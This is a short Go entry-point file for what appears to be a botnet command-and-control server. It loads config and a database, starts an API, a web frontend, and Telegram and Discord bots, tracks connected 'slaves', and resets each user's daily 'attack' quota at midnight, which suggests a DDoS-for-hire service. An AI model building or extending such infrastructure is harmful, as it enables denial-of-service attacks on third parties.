package main

import (
	"cnc/core/api"
	"cnc/core/config"
	"cnc/core/database"
	"cnc/core/discordbot"
	"cnc/core/frontend"
	"cnc/core/masters"
	"cnc/core/slaves"
	tg "cnc/core/telegram"
	"fmt"
	"time"
)

func main() {
	if err := config.LoadConfig("./assets/config.json"); err != nil {
		panic(err)
	}

	if err := database.NewDatabase(config.Config.Database.URL); err != nil {
		panic(err)
	}

	slaves.NewClientList()

	go api.Serve()
	go frontend.Init()
	if config.Config.Telegram.Enabled {
		go tg.Init()
	}
	if config.Config.Discord.Enabled {
		go discordbot.Init()
	}

	go func() {
		for {
			now := time.Now()
			next := time.Date(now.Year(), now.Month(), now.Day()+1, 0, 0, 0, 0, now.Location())
			time.Sleep(next.Sub(now))
			if err := database.DatabaseConnection.ResetAllUserAttacks(); err != nil {
				fmt.Println("Failed to reset daily attacks:", err)
			} else {
				fmt.Println("Reset daily attacks successfully")
			}
		}
	}()

	masters.Listen()
}
